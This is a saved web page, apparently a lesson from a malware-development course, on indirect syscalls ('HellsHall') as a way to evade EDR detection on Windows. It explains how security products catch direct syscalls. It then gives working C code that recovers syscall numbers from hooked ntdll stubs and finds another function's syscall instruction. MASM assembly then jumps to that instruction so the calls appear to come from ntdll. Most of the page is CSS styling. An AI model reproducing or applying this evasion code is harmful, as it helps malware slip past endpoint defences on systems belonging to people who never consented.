<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>89. Indirect Syscalls - HellsHall</title><style>
/* cspell:disable-file */
/* webkit printing magic: print all background colors */
html {
	-webkit-print-color-adjust: exact;
}
* {
	box-sizing: border-box;
	-webkit-print-color-adjust: exact;
}

html,
body {
	margin: 0;
	padding: 0;
}
@media only screen {
	body {
		margin: 2em auto;
		max-width: 900px;
		color: rgb(55, 53, 47);
	}
}

body {
	line-height: 1.5;
	white-space: pre-wrap;
}

a,
a.visited {
	color: inherit;
	text-decoration: underline;
}

.pdf-relative-link-path {
	font-size: 80%;
	color: #444;
}

h1,
h2,
h3 {
	letter-spacing: -0.01em;
	line-height: 1.2;
	font-weight: 600;
	margin-bottom: 0;
}

.page-title {
	font-size: 2.5rem;
	font-weight: 700;
	margin-top: 0;
	margin-bottom: 0.75em;
}

h1 {
	font-size: 1.875rem;
	margin-top: 1.875rem;
}

h2 {
	font-size: 1.5rem;
	margin-top: 1.5rem;
}

h3 {
	font-size: 1.25rem;
	margin-top: 1.25rem;
}

.source {
	border: 1px solid #ddd;
	border-radius: 3px;
	padding: 1.5em;
	word-break: break-all;
}

.callout {
	border-radius: 3px;
	padding: 1rem;
}

figure {
	margin: 1.25em 0;
	page-break-inside: avoid;
}

figcaption {
	opacity: 0.5;
	font-size: 85%;
	margin-top: 0.5em;
}

mark {
	background-color: transparent;
}

.indented {
	padding-left: 1.5em;
}

hr {
	background: transparent;
	display: block;
	width: 100%;
	height: 1px;
	visibility: visible;
	border: none;
	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
}

img {
	max-width: 100%;
}

@media only print {
	img {
		max-height: 100vh;
		object-fit: contain;
	}
}

@page {
	margin: 1in;
}

.collection-content {
	font-size: 0.875rem;
}

.column-list {
	display: flex;
	justify-content: space-between;
}

.column {
	padding: 0 1em;
}

.column:first-child {
	padding-left: 0;
}

.column:last-child {
	padding-right: 0;
}

.table_of_contents-item {
	display: block;
	font-size: 0.875rem;
	line-height: 1.3;
	padding: 0.125rem;
}

.table_of_contents-indent-1 {
	margin-left: 1.5rem;
}

.table_of_contents-indent-2 {
	margin-left: 3rem;
}

.table_of_contents-indent-3 {
	margin-left: 4.5rem;
}

.table_of_contents-link {
	text-decoration: none;
	opacity: 0.7;
	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
}

table,
th,
td {
	border: 1px solid rgba(55, 53, 47, 0.09);
	border-collapse: collapse;
}

table {
	border-left: none;
	border-right: none;
}

th,
td {
	font-weight: normal;
	padding: 0.25em 0.5em;
	line-height: 1.5;
	min-height: 1.5em;
	text-align: left;
}

th {
	color: rgba(55, 53, 47, 0.6);
}

ol,
ul {
	margin: 0;
	margin-block-start: 0.6em;
	margin-block-end: 0.6em;
}

li > ol:first-child,
li > ul:first-child {
	margin-block-start: 0.6em;
}

ul > li {
	list-style: disc;
}

ul.to-do-list {
	padding-inline-start: 0;
}

ul.to-do-list > li {
	list-style: none;
}

.to-do-children-checked {
	text-decoration: line-through;
	opacity: 0.375;
}

ul.toggle > li {
	list-style: none;
}

ul {
	padding-inline-start: 1.7em;
}

ul > li {
	padding-left: 0.1em;
}

ol {
	padding-inline-start: 1.6em;
}

ol > li {
	padding-left: 0.2em;
}

.mono ol {
	padding-inline-start: 2em;
}

.mono ol > li {
	text-indent: -0.4em;
}

.toggle {
	padding-inline-start: 0em;
	list-style-type: none;
}

/* Indent toggle children */
.toggle > li > details {
	padding-left: 1.7em;
}

.toggle > li > details > summary {
	margin-left: -1.1em;
}

.selected-value {
	display: inline-block;
	padding: 0 0.5em;
	background: rgba(206, 205, 202, 0.5);
	border-radius: 3px;
	margin-right: 0.5em;
	margin-top: 0.3em;
	margin-bottom: 0.3em;
	white-space: nowrap;
}

.collection-title {
	display: inline-block;
	margin-right: 1em;
}

.simple-table {
	margin-top: 1em;
	font-size: 0.875rem;
	empty-cells: show;
}
.simple-table td {
	height: 29px;
	min-width: 120px;
}

.simple-table th {
	height: 29px;
	min-width: 120px;
}

.simple-table-header-color {
	background: rgb(247, 246, 243);
	color: black;
}
.simple-table-header {
	font-weight: 500;
}

time {
	opacity: 0.5;
}

.icon {
	display: inline-block;
	max-width: 1.2em;
	max-height: 1.2em;
	text-decoration: none;
	vertical-align: text-bottom;
	margin-right: 0.5em;
}

img.icon {
	border-radius: 3px;
}

.user-icon {
	width: 1.5em;
	height: 1.5em;
	border-radius: 100%;
	margin-right: 0.5rem;
}

.user-icon-inner {
	font-size: 0.8em;
}

.text-icon {
	border: 1px solid #000;
	text-align: center;
}

.page-cover-image {
	display: block;
	object-fit: cover;
	width: 100%;
	max-height: 30vh;
}

.page-header-icon {
	font-size: 3rem;
	margin-bottom: 1rem;
}

.page-header-icon-with-cover {
	margin-top: -0.72em;
	margin-left: 0.07em;
}

.page-header-icon img {
	border-radius: 3px;
}

.link-to-page {
	margin: 1em 0;
	padding: 0;
	border: none;
	font-weight: 500;
}

p > .user {
	opacity: 0.5;
}

td > .user,
td > time {
	white-space: nowrap;
}

input[type="checkbox"] {
	transform: scale(1.5);
	margin-right: 0.6em;
	vertical-align: middle;
}

p {
	margin-top: 0.5em;
	margin-bottom: 0.5em;
}

.image {
	border: none;
	margin: 1.5em 0;
	padding: 0;
	border-radius: 0;
	text-align: center;
}

.code,
code {
	background: rgba(135, 131, 120, 0.15);
	border-radius: 3px;
	padding: 0.2em 0.4em;
	border-radius: 3px;
	font-size: 85%;
	tab-size: 2;
}

code {
	color: #eb5757;
}

.code {
	padding: 1.5em 1em;
}

.code-wrap {
	white-space: pre-wrap;
	word-break: break-all;
}

.code > code {
	background: none;
	padding: 0;
	font-size: 100%;
	color: inherit;
}

blockquote {
	font-size: 1.25em;
	margin: 1em 0;
	padding-left: 1em;
	border-left: 3px solid rgb(55, 53, 47);
}

.bookmark {
	text-decoration: none;
	max-height: 8em;
	padding: 0;
	display: flex;
	width: 100%;
	align-items: stretch;
}

.bookmark-title {
	font-size: 0.85em;
	overflow: hidden;
	text-overflow: ellipsis;
	height: 1.75em;
	white-space: nowrap;
}

.bookmark-text {
	display: flex;
	flex-direction: column;
}

.bookmark-info {
	flex: 4 1 180px;
	padding: 12px 14px 14px;
	display: flex;
	flex-direction: column;
	justify-content: space-between;
}

.bookmark-image {
	width: 33%;
	flex: 1 1 180px;
	display: block;
	position: relative;
	object-fit: cover;
	border-radius: 1px;
}

.bookmark-description {
	color: rgba(55, 53, 47, 0.6);
	font-size: 0.75em;
	overflow: hidden;
	max-height: 4.5em;
	word-break: break-word;
}

.bookmark-href {
	font-size: 0.75em;
	margin-top: 0.25em;
}

.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.highlight-default {
	color: rgba(55, 53, 47, 1);
}
.highlight-gray {
	color: rgba(120, 119, 116, 1);
	fill: rgba(120, 119, 116, 1);
}
.highlight-brown {
	color: rgba(159, 107, 83, 1);
	fill: rgba(159, 107, 83, 1);
}
.highlight-orange {
	color: rgba(217, 115, 13, 1);
	fill: rgba(217, 115, 13, 1);
}
.highlight-yellow {
	color: rgba(203, 145, 47, 1);
	fill: rgba(203, 145, 47, 1);
}
.highlight-teal {
	color: rgba(68, 131, 97, 1);
	fill: rgba(68, 131, 97, 1);
}
.highlight-blue {
	color: rgba(51, 126, 169, 1);
	fill: rgba(51, 126, 169, 1);
}
.highlight-purple {
	color: rgba(144, 101, 176, 1);
	fill: rgba(144, 101, 176, 1);
}
.highlight-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.highlight-red {
	color: rgba(212, 76, 71, 1);
	fill: rgba(212, 76, 71, 1);
}
.highlight-gray_background {
	background: rgba(241, 241, 239, 1);
}
.highlight-brown_background {
	background: rgba(244, 238, 238, 1);
}
.highlight-orange_background {
	background: rgba(251, 236, 221, 1);
}
.highlight-yellow_background {
	background: rgba(251, 243, 219, 1);
}
.highlight-teal_background {
	background: rgba(237, 243, 236, 1);
}
.highlight-blue_background {
	background: rgba(231, 243, 248, 1);
}
.highlight-purple_background {
	background: rgba(244, 240, 247, 0.8);
}
.highlight-pink_background {
	background: rgba(249, 238, 243, 0.8);
}
.highlight-red_background {
	background: rgba(253, 235, 236, 1);
}
.block-color-default {
	color: inherit;
	fill: inherit;
}
.block-color-gray {
	color: rgba(120, 119, 116, 1);
	fill: rgba(120, 119, 116, 1);
}
.block-color-brown {
	color: rgba(159, 107, 83, 1);
	fill: rgba(159, 107, 83, 1);
}
.block-color-orange {
	color: rgba(217, 115, 13, 1);
	fill: rgba(217, 115, 13, 1);
}
.block-color-yellow {
	color: rgba(203, 145, 47, 1);
	fill: rgba(203, 145, 47, 1);
}
.block-color-teal {
	color: rgba(68, 131, 97, 1);
	fill: rgba(68, 131, 97, 1);
}
.block-color-blue {
	color: rgba(51, 126, 169, 1);
	fill: rgba(51, 126, 169, 1);
}
.block-color-purple {
	color: rgba(144, 101, 176, 1);
	fill: rgba(144, 101, 176, 1);
}
.block-color-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.block-color-red {
	color: rgba(212, 76, 71, 1);
	fill: rgba(212, 76, 71, 1);
}
.block-color-gray_background {
	background: rgba(241, 241, 239, 1);
}
.block-color-brown_background {
	background: rgba(244, 238, 238, 1);
}
.block-color-orange_background {
	background: rgba(251, 236, 221, 1);
}
.block-color-yellow_background {
	background: rgba(251, 243, 219, 1);
}
.block-color-teal_background {
	background: rgba(237, 243, 236, 1);
}
.block-color-blue_background {
	background: rgba(231, 243, 248, 1);
}
.block-color-purple_background {
	background: rgba(244, 240, 247, 0.8);
}
.block-color-pink_background {
	background: rgba(249, 238, 243, 0.8);
}
.block-color-red_background {
	background: rgba(253, 235, 236, 1);
}
.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
.select-value-color-translucentGray { background-color: rgba(255, 255, 255, 0.0375); }
.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }

.checkbox {
	display: inline-flex;
	vertical-align: text-bottom;
	width: 16;
	height: 16;
	background-size: 16px;
	margin-left: 2px;
	margin-right: 5px;
}

.checkbox-on {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
}

.checkbox-off {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
}
	
</style></head><body><article id="94f45eeb-837f-4eb6-829f-55eb1d6c20dc" class="page sans"><header><h1 class="page-title"><a href="https://maldevacademy.com/modules/89"><strong>89. Indirect Syscalls - HellsHall</strong></a></h1></header><div class="page-body"><h2 id="20d1173a-1032-455c-aee2-a0117f3b345d" class=""><strong>Indirect Syscalls - HellsHall</strong></h2><h3 id="1a8c9f77-eaa2-42fd-828b-568ef4df070d" class=""><strong>Introduction</strong></h3><p id="3057a4a4-cdf1-4b49-90ac-a18bca4fff08" class="">The Hell&#x27;s Gate implementation was updated in the previous module to improve its ability to obtain the SSN of any hooked syscall. Unfortunately, the implementation still relied on direct syscalls where the syscall function is executed from within the address space of the local process rather than where it&#x27;s supposed to be executed from, <code>ntdll.dll</code>. Direct syscalls can be detected by EDRs and other security solutions due to the use of callbacks that are triggered when the program flow is transferred between user and kernel mode or vice versa which is when the <code>syscall</code> is executed or returned. Recall that the <code>syscall</code> instruction in 64-bit assembly is used to switch the processor from user mode to kernel mode and initiate a system call.</p><p id="5593ab6a-29db-4d8b-9199-f2cfcac6c031" class="">For example, if a security solution uses <a href="http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FProcess%2FNtSetInformationProcess.html">NtSetProcessInformation</a> with the <code>ProcessInstrumentationCallback</code> flag, it can set a callback function to be executed whenever the execution flow returns to user mode from the kernel. The triggered callback function can then analyze whether the syscall executed came from <code>ntdll.dll</code>&#x27;s address space or not. More on detecting syscalls can be found <a href="https://pre.empt.blog/2022/implementing-syscall-detection-into-fennec">here</a>.</p><p id="8cedabba-061c-4cc4-a1ae-e32b024c3d68" class="">Essentially if the <code>syscall</code> instruction is executed directly from within an assembly file, it can be detected and flagged as suspicious, regardless of which syscall function was used, since the <code>syscall</code> instruction should only ever be executed from within <code>ntdll.dll</code>. To circumvent this, an indirect syscall technique must be used which requires jumping to an address of a <code>syscall</code> instruction located within ntdll.dll. When security solutions trigger the callback function they would see that the <code>syscall</code> instruction was being called from within <code>ntdll.dll</code>&#x27;s address space and assume it&#x27;s legitimate, although it was performed by the local program.</p><p id="1a042119-9f9d-4187-a2d7-c8704d583eef" class="">The following image illustrates how indirect syscalls are performed.</p><figure id="394dd7c6-f3d3-4ab1-a3a9-5e82bbea9c98" class="image"><a href="89%20Indirect%20Syscalls%20-%20HellsHall%2094f45eeb837f4eb6829f55eb1d6c20dc/indirect-syscalls-119305197-c35a0c2c-fc29-4153-ada5-aa88d131996d.png"><img style="width:1295px" src="89%20Indirect%20Syscalls%20-%20HellsHall%2094f45eeb837f4eb6829f55eb1d6c20dc/indirect-syscalls-119305197-c35a0c2c-fc29-4153-ada5-aa88d131996d.png"/></a></figure><h3 id="645b9030-aa55-4a36-96fa-703ddf8e03a6" class=""><strong>Finding a Syscall Address</strong></h3><p id="243b45cc-2ad3-4495-a426-8f3a485ac967" class="">The same code from the previous module will continue to be used, as the SSN of a specified syscall is still necessary to execute indirect syscalls. The only difference will be in the assembly functions, where the <code>syscall</code> instruction needs to be replaced with a <code>jmp</code> instruction. The <code>jmp</code> instruction will require an address to jump to, which as mentioned previously, will be located inside <code>ntdll.dll</code> and therefore the address must be first retrieved.</p><p id="ceb0a3c1-41df-49ed-b8a4-ed621083c1f6" class="">Any valid <code>syscall</code> instruction address can be used but it&#x27;s preferred that the instruction belongs to a different syscall than the one being called. For example, if <code>NtAllocateVirtualMemory</code> is being called, it is better to jump to a <code>syscall</code> instruction address that does not belong to <code>NtAllocateVirtualMemory</code> in memory.</p><p id="22eb9b10-ed88-4bd6-9ea0-41e076a6bab2" class="">Therefore instead of jumping to <code>NtAllocateVirtualMemory</code>&#x27;s syscall instruction address, <code>0x0007FF8308E3E82</code>, instead jump to <code>0x0007FF8308E3EE2</code> which is the address of <code>ZwWriteFileGather</code>&#x27;s <code>syscall</code> instruction.</p><figure id="2f3c3297-9d27-40fe-93b2-42453e10350e" class="image"><a href="89%20Indirect%20Syscalls%20-%20HellsHall%2094f45eeb837f4eb6829f55eb1d6c20dc/indirect-syscalls-219308096-e7b35871-ecc6-4b5a-9bf4-b7c3336002f0.png"><img style="width:1146px" src="89%20Indirect%20Syscalls%20-%20HellsHall%2094f45eeb837f4eb6829f55eb1d6c20dc/indirect-syscalls-219308096-e7b35871-ecc6-4b5a-9bf4-b7c3336002f0.png"/></a></figure><h3 id="938e6594-8b9b-4b3b-956a-6de2a9fa1d17" class=""><strong>Updating The NT_SYSCALL Structure</strong></h3><p id="5e9bb75f-38f2-43b2-bb09-696a8f7617b1" class="">To do this, the newly introduced <code>NT_SYSCALL</code> structure will now contain a new member, <code>pSyscallInstAddress</code>. This member holds the address of a random <code>syscall</code> instruction in NTDLL.</p><pre id="78627a35-4a62-4462-b7a8-41e9e2d17649" class="code code-wrap"><code>typedef struct _NT_SYSCALL
{
    DWORD dwSSn;                    // syscall number
    DWORD dwSyscallHash;            // syscall hash value
    PVOID pSyscallAddress;          // syscall address
    PVOID pSyscallInstAddress;      // address of a random &#x27;syscall&#x27; instruction in ntdll

}NT_SYSCALL, * PNT_SYSCALL;
</code></pre><h3 id="86be54da-a849-4f07-b617-687714ffcedb" class=""><strong>Updating FetchNtSyscall</strong></h3><p id="b9a400cd-5fa1-4f4e-9194-eab122420b96" class="">The next step is to modify the <code>FetchNtSyscall</code> function to search for the <code>syscall</code> instruction address. The updated code performs the following:</p><ul id="445f9ed9-8bc0-41cc-ba9c-b296cc8f332c" class="bulleted-list"><li style="list-style-type:disc">Checks if the syscall&#x27;s address is successfully retrieved.</li></ul><ul id="f2f2f73f-0744-498c-90a0-a79934cac51e" class="bulleted-list"><li style="list-style-type:disc">Add <code>0xFF</code> or 225 bytes (in decimal) to the address of the syscall function to search for a <code>syscall</code> instruction. The reason 225 bytes are added to the syscall function&#x27;s address is to search for the <code>syscall</code> instruction in a random function that is 225 bytes away from the initial syscall. Keep in mind that the value of 225 is completely arbitrary and could be replaced with any other value.</li></ul><ul id="a630691c-d68b-4daf-a2dd-61f0d3fd487d" class="bulleted-list"><li style="list-style-type:disc">Initiates a for-loop that searches for the opcodes <code>0x0f</code> and <code>0x05</code> which represent the <code>syscall</code> instruction.</li></ul><ul id="195f562a-529c-4356-8375-88fc10f71fee" class="bulleted-list"><li style="list-style-type:disc">The search boundary is <code>RANGE</code> which is 225, meaning that this for-loop can search 225 bytes for the <code>syscall</code> instruction.</li></ul><ul id="5c73f0bd-4403-40a4-a2b9-f6b8e4f531da" class="bulleted-list"><li style="list-style-type:disc">When a match is found, <code>pSyscallInstAddress</code> is set to the address of the retrieved <code>syscall</code> instruction.</li></ul><pre id="7ea512b0-b04a-4bcb-8881-1b30102dfd63" class="code code-wrap"><code>BOOL FetchNtSyscall(IN DWORD dwSysHash, OUT PNT_SYSCALL pNtSys) {

    // initialize ntdll config if not found
    if (!g_NtdllConf.uModule) {
        if (!InitNtdllConfigStructure())
            return FALSE;
    }

    if (dwSysHash != NULL)
        pNtSys-&gt;dwSyscallHash = dwSysHash;
    else
        return FALSE;

    for (size_t i = 0; i &lt; g_NtdllConf.dwNumberOfNames; i++) {

        PCHAR pcFuncName    = (PCHAR)(g_NtdllConf.uModule + g_NtdllConf.pdwArrayOfNames[i]);
        PVOID pFuncAddress  = (PVOID)(g_NtdllConf.uModule + g_NtdllConf.pdwArrayOfAddresses[g_NtdllConf.pwArrayOfOrdinals[i]]);

        // if syscall found
        if (HASH(pcFuncName) == dwSysHash) {

            pNtSys-&gt;pSyscallAddress = pFuncAddress;

            if (*((PBYTE)pFuncAddress) == 0x4C
                &amp;&amp; *((PBYTE)pFuncAddress + 1) == 0x8B
                &amp;&amp; *((PBYTE)pFuncAddress + 2) == 0xD1
                &amp;&amp; *((PBYTE)pFuncAddress + 3) == 0xB8
                &amp;&amp; *((PBYTE)pFuncAddress + 6) == 0x00
                &amp;&amp; *((PBYTE)pFuncAddress + 7) == 0x00) {

                BYTE high = *((PBYTE)pFuncAddress + 5);
                BYTE low = *((PBYTE)pFuncAddress + 4);
                pNtSys-&gt;dwSSn = (high &lt;&lt; 8) | low;
                break; // break for-loop [i]
            }

            // if hooked - scenario 1
            if (*((PBYTE)pFuncAddress) == 0xE9) {

                for (WORD idx = 1; idx &lt;= RANGE; idx++) {
                    // check neighboring syscall down
                    if (*((PBYTE)pFuncAddress + idx * DOWN) == 0x4C
                        &amp;&amp; *((PBYTE)pFuncAddress + 1 + idx * DOWN) == 0x8B
                        &amp;&amp; *((PBYTE)pFuncAddress + 2 + idx * DOWN) == 0xD1
                        &amp;&amp; *((PBYTE)pFuncAddress + 3 + idx * DOWN) == 0xB8
                        &amp;&amp; *((PBYTE)pFuncAddress + 6 + idx * DOWN) == 0x00
                        &amp;&amp; *((PBYTE)pFuncAddress + 7 + idx * DOWN) == 0x00) {

                        BYTE high = *((PBYTE)pFuncAddress + 5 + idx * DOWN);
                        BYTE low = *((PBYTE)pFuncAddress + 4 + idx * DOWN);
                        pNtSys-&gt;dwSSn = (high &lt;&lt; 8) | low - idx;
                        break; // break for-loop [idx]
                    }
                    // check neighboring syscall up
                    if (*((PBYTE)pFuncAddress + idx * UP) == 0x4C
                        &amp;&amp; *((PBYTE)pFuncAddress + 1 + idx * UP) == 0x8B
                        &amp;&amp; *((PBYTE)pFuncAddress + 2 + idx * UP) == 0xD1
                        &amp;&amp; *((PBYTE)pFuncAddress + 3 + idx * UP) == 0xB8
                        &amp;&amp; *((PBYTE)pFuncAddress + 6 + idx * UP) == 0x00
                        &amp;&amp; *((PBYTE)pFuncAddress + 7 + idx * UP) == 0x00) {

                        BYTE high = *((PBYTE)pFuncAddress + 5 + idx * UP);
                        BYTE low = *((PBYTE)pFuncAddress + 4 + idx * UP);
                        pNtSys-&gt;dwSSn = (high &lt;&lt; 8) | low + idx;
                        break; // break for-loop [idx]
                    }
                }
            }

            // if hooked - scenario 2
            if (*((PBYTE)pFuncAddress + 3) == 0xE9) {

                for (WORD idx = 1; idx &lt;= RANGE; idx++) {
                    // check neighboring syscall down
                    if (*((PBYTE)pFuncAddress + idx * DOWN) == 0x4C
                        &amp;&amp; *((PBYTE)pFuncAddress + 1 + idx * DOWN) == 0x8B
                        &amp;&amp; *((PBYTE)pFuncAddress + 2 + idx * DOWN) == 0xD1
                        &amp;&amp; *((PBYTE)pFuncAddress + 3 + idx * DOWN) == 0xB8
                        &amp;&amp; *((PBYTE)pFuncAddress + 6 + idx * DOWN) == 0x00
                        &amp;&amp; *((PBYTE)pFuncAddress + 7 + idx * DOWN) == 0x00) {

                        BYTE high = *((PBYTE)pFuncAddress + 5 + idx * DOWN);
                        BYTE low = *((PBYTE)pFuncAddress + 4 + idx * DOWN);
                        pNtSys-&gt;dwSSn = (high &lt;&lt; 8) | low - idx;
                        break; // break for-loop [idx]
                    }
                    // check neighboring syscall up
                    if (*((PBYTE)pFuncAddress + idx * UP) == 0x4C
                        &amp;&amp; *((PBYTE)pFuncAddress + 1 + idx * UP) == 0x8B
                        &amp;&amp; *((PBYTE)pFuncAddress + 2 + idx * UP) == 0xD1
                        &amp;&amp; *((PBYTE)pFuncAddress + 3 + idx * UP) == 0xB8
                        &amp;&amp; *((PBYTE)pFuncAddress + 6 + idx * UP) == 0x00
                        &amp;&amp; *((PBYTE)pFuncAddress + 7 + idx * UP) == 0x00) {

                        BYTE high = *((PBYTE)pFuncAddress + 5 + idx * UP);
                        BYTE low = *((PBYTE)pFuncAddress + 4 + idx * UP);
                        pNtSys-&gt;dwSSn = (high &lt;&lt; 8) | low + idx;
                        break; // break for-loop [idx]
                    }
                }
            }

            break; // break for-loop [i]
        }

    }

//-----------------------------------------------------------------------------------------------------------------------
// updated part //

    if (!pNtSys-&gt;pSyscallAddress)
        return FALSE;

    // looking somewhere random (0xFF byte away from the syscall address)
    ULONG_PTR uFuncAddress = (ULONG_PTR)pNtSys-&gt;pSyscallAddress + 0xFF;

    // getting the &#x27;syscall&#x27; instruction of another syscall function
    for (DWORD z = 0, x = 1; z &lt;= RANGE; z++, x++) {
        if (*((PBYTE)uFuncAddress + z) == 0x0F &amp;&amp; *((PBYTE)uFuncAddress + x) == 0x05) {
            pNtSys-&gt;pSyscallInstAddress = ((ULONG_PTR)uFuncAddress + z);
            break; // break for-loop [x &amp; z]
        }
    }

//-----------------------------------------------------------------------------------------------------------------------

    if (pNtSys-&gt;dwSSn != NULL &amp;&amp; pNtSys-&gt;pSyscallAddress != NULL &amp;&amp; pNtSys-&gt;dwSyscallHash != NULL &amp;&amp; pNtSys-&gt;pSyscallInstAddress != NULL)
        return TRUE;
    else
        return FALSE;

}
</code></pre><h3 id="1b0ba46a-9b30-411f-b4ba-06a3419b67fd" class=""><strong>Updating SetSSn And RunSyscall</strong></h3><p id="8da6857b-05e1-42a1-9da6-9e92d79fe58f" class="">Recall the updated assembly functions in the previous module, <code>SetSSn</code> and <code>RunSyscall</code>. Both functions were used to initiate a syscall in the updated Hell&#x27;s Gate implementation.</p><p id="dad5a0bb-4cf9-4435-a94c-40071921a682" class="">Previously, <code>SetSSn</code> only required the SSN of the syscall to be called and then used <code>RunSyscall</code> to execute it. Now, <code>SetSSn</code> requires another value, <code>qSyscallInsAdress</code>, which is the address of the <code>syscall</code> instruction to jump to. After <code>SetSSn</code> initializes these values, <code>RunSyscall</code> will execute them.</p><h3 id="2f9757da-b6bd-4f2b-9f4b-14d34674f018" class=""><strong>Unobfuscated Assembly Functions</strong></h3><p id="e0ef17fb-fab7-4e9b-a38b-75083b6a379d" class=""><code>SetSSN</code> &amp; <code>RunSyscall</code> without unnecessary assembly instructions.</p><pre id="696b6332-6945-4135-ab1c-af4ff792dcf2" class="code code-wrap"><code>.data

  wSystemCall       DWORD	0h
  qSyscallInsAdress QWORD	0h

.code

  SetSSn PROC
      mov wSystemCall, 0h
      mov qSyscallInsAdress, 0h
      mov wSystemCall, ecx		; saving the ssn value to wSystemCall
      mov qSyscallInsAdress, rdx	; saving the syscall instruction address to qSyscallInsAdress
      ret
  SetSSn ENDP

  RunSyscall PROC
      mov r10, rcx
      mov eax, wSystemCall
      jmp qword ptr [qSyscallInsAdress]	; jumping to qSyscallInsAdress instead of calling &#x27;syscall&#x27;
      ret
  RunSyscall ENDP

end
